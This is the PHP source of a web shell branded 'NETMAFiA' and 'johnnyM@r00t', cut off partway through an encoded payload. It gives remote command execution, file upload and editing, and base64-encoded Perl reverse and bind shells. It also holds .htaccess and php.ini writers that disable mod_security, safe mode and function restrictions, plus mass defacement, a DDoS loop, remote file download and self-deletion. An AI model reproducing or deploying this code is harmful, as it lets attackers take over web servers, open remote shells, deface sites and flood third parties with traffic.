<?php
session_start();
set_time_limit(0);
error_reporting(0);
if (get_magic_quotes_gpc()) {
function stripslashes_deep($value)    {
        $value = is_array($value) ?
                    array_map('stripslashes_deep', $value) :
                    stripslashes($value);

        return $value;
    }
$_POST = array_map('stripslashes_deep', $_POST);
$_GET = array_map('stripslashes_deep', $_GET);
$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
$_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}
if($_GET['do']=="remove"){
unlink(getcwd().$_SERVER["SCRIPT_NAME"]);
}
$basep=$_SERVER['DOCUMENT_ROOT'];
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
$slash="\\";
$basep=str_replace("/","\\",$basep);
}else{
$slash="/";
$basep=str_replace("\\","/",$basep);
}
if($_GET['do']=="remove"){
unlink(getcwd().$slash.$_SERVER["SCRIPT_NAME"]);
}
if ($_REQUEST['address']){
if(is_readable($_REQUEST['address'])){
chdir($_REQUEST['address']);}else{
alert("Permission Denied !");}}
$me=$_SERVER['PHP_SELF'];
$formp="<form method=post action='".$me."'>";
$formg="<form method=get action='".$me."'>";
$nowaddress='<input type=hidden name=address value="'.getcwd().'">';
if (isset($_FILES["filee"]) and ! $_FILES["filee"]["error"]) {
   if(move_uploaded_file($_FILES["filee"]["tmp_name"], $_FILES["filee"]["name"])){
   alert("File Upload Successful");
   }else{
alert("Permission Denied !");
   
   }
   }
if(ini_get('disable_functions')){
$disablef=ini_get('disable_functions');
}else{
$disablef="All Functions Enable";
}
if(ini_get('safe_mode')){
$safe_modes="On";
}else{
$safe_modes="Off";
}
if ($_REQUEST['chmode'] && $_REQUEST['chmodenum']){
if (chmod($_POST['chmode'],"0".$_POST['chmodenum'])){alert("Chmod Ok!");}else{alert("Permission Denied !");}
}
$picdir='iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAAB30lEQVR42mNggAAuIBZCwjxAzMiAC4jIykrZOLplhcWlzAuLS50PwkFRiTPl1TQDBSQk7OFYRMSejY1NA6iFiUFEUinKwS/mcURW1f9wIA7NrPwflFr63zow7bOJd9IbQ8/EN7qucW+0XOLeyJv5XmETU9RjUDV03BlX2P43oaz/f2hO+3+v5Pr/DlEV/81Div/r+eT+V3PL+C/tlvefP6Lzv6BRyD82ce1IBl07/zNJFf3/Eyon/Q8v7vuf0LPqf3Dt7P9mYWX/1YMr/oslTfrPnzjpv4h92n8Bo7D/rJJ6eQyS5n63PLJa/wcU9f33K+z9H9O7+n/TiRf/7Xp3/Ods3v9fJGnif3H37P/Cjqn/+azj/7PIGrQxsBn7P+V2yfzP45bzn9c9979cZN3/1LUX/ktMvfiftfnQf8Gw+v8C3vn/+Txy/3O7Zv1nVjCZx8DqkPCWw7/0PwgLRtb/d+vf/F+3fPZ/jtDa/0y1O/4zVW76zx5c/R+mhlnFfBsDm3fOZ/bIhv+cMU3/pXIm/xdK7f4P4oMwW0zLf7bEnv/s0c1wMSY953MMQnG1P5UKJ/8nFgvaBz9jYPTJfM2c2PqfWMxoGfCFgUFGK4pBw3wh0VhCuRSUkligaY9YzAIA/X/3S1/5EEMAAAAASUVORK5CYII=';
$picfile='iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAYAAABy6+R8AAABaElEQVR42mMIXfWfef7JT7Yrz34o33ABhj9BaKDYrP3PE6IqpgkyoINNFz9Gnnzw/f/NFz8w8JYrX//P2H6zMrByijCKpl1XPkbee/Xt//fv3zHw/ltf/x+4/vnT7O036wOzkTSuP/cu8sazz/+/fPmCgS8++vx/25XP/xcceP4xr2dLPFA5M1jTytPvIq88/vj/40fc+Oz15//LOxZXAZVzgDUtO/E68tLDD/8/fMCB33/4f/rqs/8lLQur4ZoWH3sdeeH+h//v37/Hjt+9/3/yytP/RU1ImuYefh159u67/2/fvsWK37x58//4pSf/C9A1nb7z9v/r169x4mOXHv/PQ9a0AOi8M3cgJmLDIE0nLj9Bdd6CYy8iz94BKniNBb+B0CdBmpADonP9/cjlBx7/333q8f89p9HwGaA4kF665/7/lGqkIHfwKRax9Yh1t3IICLZ1CApBx1ZAbGIbECwlr28IVM4KAPZgwQxbJyVoAAAAAElFTkSuQmCC';
$head='<style type="text/css">
A:link {text-decoration: none}
A:visited {text-decoration: none}
A:active {text-decoration: none}
A:hover {text-decoration: underline overline; color: 414141;}
.focus td{border-top:0px solid #f8f8f8;border-bottom:1px solid #ddd;background:#f2f2f2;padding:0px 0px 0px 0px;}
</style><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>johnnyM@r00t ~</title>
</head><body  topmargin="0" leftmargin="0" rightmargin="0" 
bgcolor="#f2f2f2"><div align="center">
&nbsp;<table border="1" width="1000" height="14" bordercolor="#CDCDCD" style="border-collapse: collapse; border-style: solid; border-width: 1px">
<tr>
<td height="30" width="996">
<p align="center"><font face="Tahoma" style="font-size: 9pt"><span lang="en-us"><a href="?do=home">Home</a> -- <a href="?do=filemanager&address='.getcwd().'">File Manager</a> -- <a href="?do=cmd&address='.getcwd().'">Command Execute</a> -- <a href="?do=bc&address='.getcwd().'">Back Connect</a> --
<a href="?do=bypasscmd&address='.getcwd().'">BypasS Command eXecute(SF-DF)</a> -- <a href="?do=symlink&address='.getcwd().'">Symlink</a> --
<a href="?do=bypassdir&address='.getcwd().'">BypasS Directory</a> -- <a href="?do=eval&address='.getcwd().'">
Eval Php</a> -- <a href="?do=db&address='.getcwd().'">Data Base</a> -- <a href="?do=convert&address='.getcwd().'">Convert</a> -- <a href="?do=mail&address='.getcwd().'">Mail Boomber</a><a href="?do=info&address='.getcwd().'">
<br>Server Information</a> -- <a href="?do=d0slocal&address='.getcwd().'">Dos Local Server</a> -- <a href="?do=dump&address='.getcwd().'">Backup Database</a> -- <a href="?do=mass&address='.getcwd().'">Mass Deface</a> -- <a href="?do=dlfile&address='.getcwd().'">Download Remote File</a> -- <a href="?do=dd0s&address='.getcwd().'">DDoS</a> -- <a href="?do=perm&address='.getcwd().'">Find Writable Directory</a> -- <a href="?do=apache&address='.getcwd().'">Server</a></span></font></td></tr></table></div>
<div align="center">
<table id="table2" style="border-collapse: collapse; border-style: 
solid;" width="1000" bgcolor="#eaeaea" border="1" bordercolor="#c6c6c6" 
cellpadding="0"><tbody><tr><td><div align="center"><table id="table3" style="border-style:dashed; border-width:1px; margin-top: 1px; margin-bottom: 0px; 
border-collapse: collapse" width="950" border="1" bordercolor="#cdcdcd"
height="10" bordercolorlight="#CDCDCD" bordercolordark="#CDCDCD"><tbody><tr><font face="Tahoma" style="font-size: 9pt"><div align="center">
Operation System : '.php_uname().' | Php Version : '.phpversion().' | Safe Mode : '.$safe_modes.' <td style="border: 1px solid rgb(198, 198, 198);" 
width="950" bgcolor="#e7e3de" height="10" valign="top">';
$end='</td></tr></tbody></table></div></td></tr><tr><td bgcolor="#c6c6c6"><p style="margin-top: 0pt; margin-bottom: 0pt" align="center"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt">'.base64_decode("IyBQQVRSQU9qb2hubnk=").'<br><font size=1>'.base64_decode("IyBORVRNQUZpQSBWaVAgU0gzTEw=").'</a></font></span></td></tr></tbody></table></div></body></html>';
$deny=$head."<p align='center'> <b>Oh My God!<br> Permission Denied".$end;
function alert($text){
echo "<script>alert('".$text."')</script>";
}
if ($_GET['do']=="edit" && $_GET['filename']!="dir"){
if(is_readable($_GET['address'].$_GET['filename'])){
$opedit=fopen($_GET['address'].$_GET['filename'],"r");
while(!feof($opedit))
$data.=fread($opedit,9999);
fclose($opedit); 
echo $head.$formp.$nowaddress.'<p align="center">File Name : '.$_GET['address'].$_GET['filename'].'<br><textarea rows="19" name="fedit" cols="87">'.htmlentities("$data").'</textarea><br><input value='.$_GET['filename'].' name=namefe><br><input type=submit value="  Save  "></form></p>'.$end;exit;
}else{alert("Permission Denied !");}}
function sizee($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
if($_REQUEST['do']=='about'){
echo $head."<p align='center'><b><font color=red>NETMAFiA ~ PATRAOjohnnyM</b>

".$end;exit;

}
function deleteDirectory($dir) {
if (!file_exists($dir)) return true;
if (!is_dir($dir) || is_link($dir)) return unlink($dir);
foreach (scandir($dir) as $item) {
if ($item == '.' || $item == '..') continue;
if (!deleteDirectory($dir . "/" . $item)) {
chmod($dir . "/" . $item, 0777);
if (!deleteDirectory($dir . "/" . $item)) return false;
};}return rmdir($dir);}

function download($fileadd,$finame){
$dlfilea=$fileadd.$finame;
header("Content-Disposition: attachment; filename=" . $finame);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($dlfilea));
flush();
$fp = fopen($$dlfilea, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}
if($_GET['do']=="rename"){
echo $head.$formp.$nowaddress.'<p align="center"><input value='.$_GET['filename'].'><input type=hidden name=addressren value='.$_GET['address'].$_GET['filename'].'> To <input name=nameren><br><input type=submit value="  Save  "></form></p>'.$end;exit;
}

if ($_GET['byapache']=='ofms'){
$fse=fopen(getcwd().$slash.".htaccess","w");
fwrite($fse,'<IfModule mod_security.c>
    Sec------Engine Off
    Sec------ScanPOST Off
</IfModule>');
fclose($fse);
}elseif ($_GET['byapache']=='bysap'){
$fse=fopen(getcwd().$slash.".htaccess","w");
fwrite($fse,'Options +FollowSymLinks
DirectoryIndex Persian-Gulf-For-Ever.html');
fclose($fse);
}elseif ($_GET['byapache']=='sfadf'){
$fse=fopen(getcwd().$slash."php.ini","w");
fwrite($fse,'safe_mode=OFF
disable_functions=NONE');
fclose($fse);
}
if($_GET['do']=="apache"){
echo $head.$formg.$nowaddress.'<p align="center">
<select name=byapache>
<option value="ofms">Off Mode Security(.htaccess)</option><option value="bysap">Bypass Symlink(.htaccess)</option>
<option value="sfadf">Disable Safe Mode & Disable Function(Php.ini)</option>
</select><br><input type=submit value=eXecute></form></p>'.$end;exit;
}
if($_GET['do']=="dd0s"){
echo $head.$formg.$nowaddress.'<p align="center">Address : <input name=urldd0 size=50> Time : <input name=timedd0 size=6 value=40000><br><input type=submit value="  DDoS  "></form></p>'.$end;exit;
}

if($_GET['urldd0'] && $_GET['timedd0']){
for ($id=0;$$id<$_GET['timedd0'];$id++){
$fp=null;
$contents=null;
$fp=fopen($_GET['urldd0'],"rb");
while (!feof($fp)) {
  $contents .= fread($fp, 8192);
}
fclose($fp);
}}
if($_GET['do']=="dlfile"){
echo $head.$formp.$nowaddress.'<p align="center">Download Remote File!<br>Address : <input name=adlr size=70><br>Save To : <input name=adsr value='.getcwd().$slash.' size=70><br><input type=submit value="  Download  "></form></p>'.$end;exit;
}
function dirpe($addres){
global $slash;
$idd=0;
if ($dirhen = @opendir($addres)) {
while ($file = readdir($dirhen)) {
$permdir=str_replace('//','/',$addres.$slash.$file);
if($file!='.' && $file!='..' && is_dir($permdir)){
if (is_writable($permdir)) {
$dirdata[$idd]['filename']=$permdir; 
$idd++;
}
dirpe($permdir);
			}
		}
		closedir($dirhen);
	} else {
		return ("notperm");
	}
	if ($dirdata){
	return $dirdata;
	}else{
		return "notfound";

	}
}
function dirpmass($addres,$massname,$masssource){
global $slash;
$idd=0;
if ($dirhen = @opendir($addres)) {
while ($file = readdir($dirhen)) {
$permdir=str_replace('//','/',$addres.$slash.$file);
if($file!='.' && $file!='..' && is_dir($permdir)){
if (is_writable($permdir)) {
if ($fm=fopen($permdir.$slash.$massname,"w")){
fwrite($fm,$masssource);
fclose($fm);
$dirdata[$idd]['filename']=$permdir; 
}

$idd++;
}
dirpmass($permdir);
			}
		}
		closedir($dirhen);
	} else {
		return ("notperm");
	}
	if ($dirdata){
	return $dirdata;
	}else{
		return "notfound";

	}
}
if($_GET['do']=="perm"){
echo $head.$formp.'<p align="center">Find All Folder Writeable<br> <input name=affw value="'.getcwd().$slash.'" size=50><br><input type=submit value="  Search  "></form></p>'.$end;exit;
}
if ($_POST['affw']){
$arrfilelist=dirpe($_POST['affw']);
if ($arrfilelist=='notfound'){
alert("Not Found !");
}elseif($arrfilelist=='notperm'){
alert("Permission Denied !");
}else{
foreach ($arrfilelist as $tmpdir){
		if ($coi %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';}
$coi++;
$permdir=$permdir.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><a href="?address='.$tmpdir['filename'].'"><b>'.$tmpdir['filename'].'</b></span></td>
<td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="22"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td></tr></table>';
}
echo $head.'
<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.getcwd()."<br>".printdrive().'<br><a href="?do=back&address='.$backaddresss.'"><font color=#000000>Back</span></td>
</tr></table>'.$permdir.'</table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Change Directory</font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><input name=address value='.getcwd().'><input type=submit value="Go"></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700">Upload ---&gt; &nbsp;</td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<form action="'.$me.'" method=post enctype=multipart/form-data>'.$nowaddress.'
<font face="Tahoma" style="font-size: 10pt"><input size=40 type=file name=filee > 
<input type=submit value=Upload /><br>'.$ifupload.'</form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt"><b>'.$formp.'Chmod ----&gt;</b>&nbsp;&nbsp;File : </td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt"><form method=post action=/now2.php><input size=55 name=chmode>&nbsp;&nbsp;Permission : <input name=chmodnum value=777 size=3> <input type=submit value=" Ok "></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt"><b>'.$formp.'Create Dir ----&gt;</b> Dirctory Name </td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt">
<input name=cdirname size=20>'.$nowaddress.' <input type=submit value=" Create "></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt">'.$formp.'<b>Create File ----&gt;</b> Name File </td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt"><input name=cfilename size=20>'.$nowaddress.' <input type=submit value=" Create "></form></td></tr><tr>
<td width="200" align="right" valign="top">
<font face="Tahoma" style="font-size: 10pt">'.$formp.'<b>Copy ----&gt;</b></b>&nbsp;&nbsp;File : </td>
<td width="750"><font face="Tahoma" style="font-size: 10pt">
<input size=40 name=copyname> To Directory <input size=40 name=cpyto> <input type=submit value =Copy></form></td>'.$end;exit;
}}
if($_GET['do']=="mass"){
echo $head.$formp.'<p align="center">[Mass Deface]<br><input name=mffw value="'.getcwd().$slash.'" size=50><input name=massname value="def.htm" size=10><br><textarea name=masssource cols=60 rows=18>Source</textarea><br><input type=submit value="  Mass  "></form></p>'.$end;exit;
}
if ($_POST['mffw']){
$arrfilelist=dirpmass($_POST['mffw'],$_POST['massname'],$_POST['masssource']);
if ($arrfilelist=='notfound'){
alert("Not Found !");
}elseif($arrfilelist=='notperm'){
alert("Permission Denied !");
}else{
foreach ($arrfilelist as $tmpdir){
		if ($coi %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';}
$coi++;
$permdir=$permdir.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><a href="?address='.$tmpdir['filename'].'"><b>'.$tmpdir['filename'].'</b></span></td>
<td valign="top" height="19" width="65"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="22"><font face="Tahoma" style="font-size: 9pt"></td><td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td>
<td valign="top" height="19" width="30"><font face="Tahoma" style="font-size: 9pt"></td></tr></table>';
}
echo $head.'
<font face="Tahoma" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 1px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="Tahoma" style="font-size: 9pt"><font color=#4a7af4>Now Directory : '.getcwd()."<br>".printdrive().'<br><a href="?do=back&address='.$backaddresss.'"><font color=#000000>Back</span></td>
</tr></table>'.$permdir.'</table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5"><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Change Directory</font></td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080"><input name=address value='.getcwd().'><input type=submit value="Go"></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt; font-weight:700">Upload ---&gt; &nbsp;</td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<form action="'.$me.'" method=post enctype=multipart/form-data>'.$nowaddress.'
<font face="Tahoma" style="font-size: 10pt"><input size=40 type=file name=filee > 
<input type=submit value=Upload /><br>'.$ifupload.'</form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt"><b>'.$formp.'Chmod ----&gt;</b>&nbsp;&nbsp;File : </td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt"><form method=post action=/now2.php><input size=55 name=chmode>&nbsp;&nbsp;Permission : <input name=chmodnum value=777 size=3> <input type=submit value=" Ok "></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt"><b>'.$formp.'Create Dir ----&gt;</b> Dirctory Name </td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt">
<input name=cdirname size=20>'.$nowaddress.' <input type=submit value=" Create "></form></td></tr><tr>
<td width="200" align="right" valign="top" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt">'.$formp.'<b>Create File ----&gt;</b> Name File </td>
<td width="750" style="border-left-width: 1px; border-right-width: 1px; border-top-width: 1px; border-bottom: 1px solid #808080">
<font face="Tahoma" style="font-size: 10pt"><input name=cfilename size=20>'.$nowaddress.' <input type=submit value=" Create "></form></td></tr><tr>
<td width="200" align="right" valign="top">
<font face="Tahoma" style="font-size: 10pt">'.$formp.'<b>Copy ----&gt;</b></b>&nbsp;&nbsp;File : </td>
<td width="750"><font face="Tahoma" style="font-size: 10pt">
<input size=40 name=copyname> To Directory <input size=40 name=cpyto> <input type=submit value =Copy></form></td>'.$end;exit;
}}
if($_POST['adlr'] && $_POST['adsr']){
$url = $_POST['adlr'];
$newfname = $_POST['adsr'] . basename($url);
$file = fopen ($url, "rb");
if ($file) {
  $newf = fopen ($newfname, "wb");
  if ($newf)
  while(!feof($file)) {
    fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );
  }
  alert("File Downloaded Success");
}else{alert("Can Not Open File");}
if ($file) {
  fclose($file);
}
if ($newf) {
  fclose($newf);
}
}
if($_GET['do']=="down" and $_GET['type']=='file'){
download($_GET['address'],$_GET['filename']);}
if($_GET['do']=="down" and $_GET['type']=='dir'){
class zipfile
{
var $datasec = array(); 
var $ctrl_dir = array(); 
var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
var $old_offset = 0;
function add_dir($name)
{
$name = str_replace("\\", "/", $name);
$fr = "\x50\x4b\x03\x04";
$fr .= "\x0a\x00";
$fr .= "\x00\x00";
$fr .= "\x00\x00";
$fr .= "\x00\x00\x00\x00";
$fr .= pack("V",0);
$fr .= pack("V",0);
$fr .= pack("V",0);
$fr .= pack("v", strlen($name) ); 
$fr .= pack("v", 0 );
$fr .= $name;
$fr .= pack("V",$crc); 
$fr .= pack("V",$c_len); 
$fr .= pack("V",$unc_len);
$this -> datasec[] = $fr;
$new_offset = strlen(implode("", $this->datasec));
$cdrec = "\x50\x4b\x01\x02";
$cdrec .="\x00\x00"; 
$cdrec .="\x0a\x00"; 
$cdrec .="\x00\x00"; 
$cdrec .="\x00\x00"; 
$cdrec .="\x00\x00\x00\x00"; 
$cdrec .= pack("V",0); 
$cdrec .= pack("V",0); 
$cdrec .= pack("V",0); 
$cdrec .= pack("v", strlen($name) );
$cdrec .= pack("v", 0 );
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$ext = "\x00\x00\x10\x00";
$ext = "\xff\xff\xff\xff";
$cdrec .= pack("V", 16 );
$cdrec .= pack("V", $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function add_file($data, $name)
{
$name = str_replace("\\", "/", $name);
$fr = "\x50\x4b\x03\x04";
$fr .= "\x14\x00";
$fr .= "\x00\x00";
$fr .= "\x08\x00"; 
$fr .= "\x00\x00\x00\x00";
$unc_len = strlen($data);
$crc = crc32($data);
$zdata = gzcompress($data);
$zdata = substr( substr($zdata, 0, strlen($zdata) - 4), 2);
$c_len = strlen($zdata);
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len);
$fr .= pack("V",$unc_len);
$fr .= pack("v", strlen($name) );
$fr .= pack("v", 0 );
$fr .= $name;
$fr .= $zdata;
$fr .= pack("V",$crc);
$fr .= pack("V",$c_len); 
$fr .= pack("V",$unc_len); 
$this -> datasec[] = $fr;
$new_offset = strlen(implode("", $this->datasec));
$cdrec = "\x50\x4b\x01\x02";
$cdrec .="\x00\x00";
$cdrec .="\x14\x00"; 
$cdrec .="\x00\x00";
$cdrec .="\x08\x00";
$cdrec .="\x00\x00\x00\x00"; 
$cdrec .= pack("V",$crc); 
$cdrec .= pack("V",$c_len); 
$cdrec .= pack("V",$unc_len); 
$cdrec .= pack("v", strlen($name) );
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("v", 0 ); 
$cdrec .= pack("V", 32 ); 
$cdrec .= pack("V", $this -> old_offset );
$this -> old_offset = $new_offset;
$cdrec .= $name;
$this -> ctrl_dir[] = $cdrec;
}
function file() { 
$data = implode("", $this -> datasec);
$ctrldir = implode("", $this -> ctrl_dir);
return
$data.
$ctrldir.
$this -> eof_ctrl_dir.
pack("v", sizeof($this -> ctrl_dir)).
pack("v", sizeof($this -> ctrl_dir)). 
pack("V", strlen($ctrldir)). 
pack("V", strlen($data)). 
"\x00\x00";
}
}
$dlfolder=$_GET['address'].$slash.$_GET['dirname'].$slash;
$zipfile = new zipfile();
function get_files_from_folder($directory, $put_into) {
global $zipfile;
if ($handle = opendir($directory)) {
while (false !== ($file = readdir($handle))) {
if (is_file($directory.$file)) {
$fileContents = file_get_contents($directory.$file);
$zipfile->add_file($fileContents, $put_into.$file);
} elseif ($file != '.' and $file != '..' and is_dir($directory.$file)) {
$zipfile->add_dir($put_into.$file.'/');
get_files_from_folder($directory.$file.'/', $put_into.$file.'/');
}
}
}
closedir($handle);
}
$datedl=date("y-m-d");
get_files_from_folder($dlfolder,'');
header("Content-Disposition: attachment; filename=" . $_GET['dirname']."-".$datedl.".zip");   
header("Content-Type: application/download");
header("Content-Length: " . strlen($zipfile -> file()));
flush();
echo $zipfile -> file(); 
$filename = $_GET['dirname']."-".$datedl.".zip";
$fd = fopen ($filename, "wb");
$out = fwrite ($fd, $zipfile -> file());
fclose ($fd);
}
if ($_REQUEST['cdirname']){
if(mkdir($_REQUEST['cdirname'],"0777")){alert("Directory Created !");}else{alert("Permission Denied !");}}
function bcn($ipbc,$pbc){
$bcperl="IyEvdXNyL2Jpbi9wZXJsCiMgQ29ubmVjdEJhY2tTaGVsbCBpbiBQZXJsLiBTaGFkb3cxMjAgLSB3
NGNrMW5nLmNvbQoKdXNlIFNvY2tldDsKCiRob3N0ID0gJEFSR1ZbMF07CiRwb3J0ID0gJEFSR1Zb
MV07CgogICAgaWYgKCEkQVJHVlswXSkgewogIHByaW50ZiAiWyFdIFVzYWdlOiBwZXJsIHNjcmlw
dC5wbCA8SG9zdD4gPFBvcnQ+XG4iOwogIGV4aXQoMSk7Cn0KcHJpbnQgIlsrXSBDb25uZWN0aW5n
IHRvICRob3N0XG4iOwokcHJvdCA9IGdldHByb3RvYnluYW1lKCd0Y3AnKTsgIyBZb3UgY2FuIGNo
YW5nZSB0aGlzIGlmIG5lZWRzIGJlCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFN
LCAkcHJvdCkgfHwgZGllICgiWy1dIFVuYWJsZSB0byBDb25uZWN0ICEiKTsKaWYgKCFjb25uZWN0
KFNFUlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsIGluZXRfYXRvbigkaG9zdCkpKSB7ZGll
KCJbLV0gVW5hYmxlIHRvIENvbm5lY3QgISIpO30KICBvcGVuKFNURElOLCI+JlNFUlZFUiIpOwog
IG9wZW4oU1RET1VULCI+JlNFUlZFUiIpOwogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOwogIGV4
ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAuICJcMCIgeCA0Ow==";
$opbc=fopen("bcc.pl","w");
fwrite($opbc,base64_decode($bcperl));
fclose($opbc);
system("perl bcc.pl $ipbc $pbc") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function wbp($wb){
$wbp="dXNlIFNvY2tldDsKJHBvcnQJPSAkQVJHVlswXTsKJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3Rj
cCcpOwpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsKc2V0c29j
a29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgcGFjaygibCIsIDEpKTsKYmlu
ZChTRVJWRVIsIHNvY2thZGRyX2luKCRwb3J0LCBJTkFERFJfQU5ZKSk7Cmxpc3RlbihTRVJWRVIs
IFNPTUFYQ09OTik7CmZvcig7ICRwYWRkciA9IGFjY2VwdChDTElFTlQsIFNFUlZFUik7IGNsb3Nl
IENMSUVOVCkKewpvcGVuKFNURElOLCAiPiZDTElFTlQiKTsKb3BlbihTVERPVVQsICI+JkNMSUVO
VCIpOwpvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7CnN5c3RlbSgnY21kLmV4ZScpOwpjbG9zZShT
VERJTik7CmNsb3NlKFNURE9VVCk7CmNsb3NlKFNUREVSUik7Cn0g";
$opwb=fopen("wbp.pl","w");
fwrite($opwb,base64_decode($wbp));
fclose($opwb);
echo getcwd();
system("perl wbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function lbp($wb){
$lbp="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7JHBvcnQ9JEFSR1ZbMF07JHByb3RvPWdldHByb3Rv
YnluYW1lKCd0Y3AnKTskY21kPSJscGQiOyQwPSRjbWQ7c29ja2V0KFNFUlZFUiwgUEZfSU5FVCwg
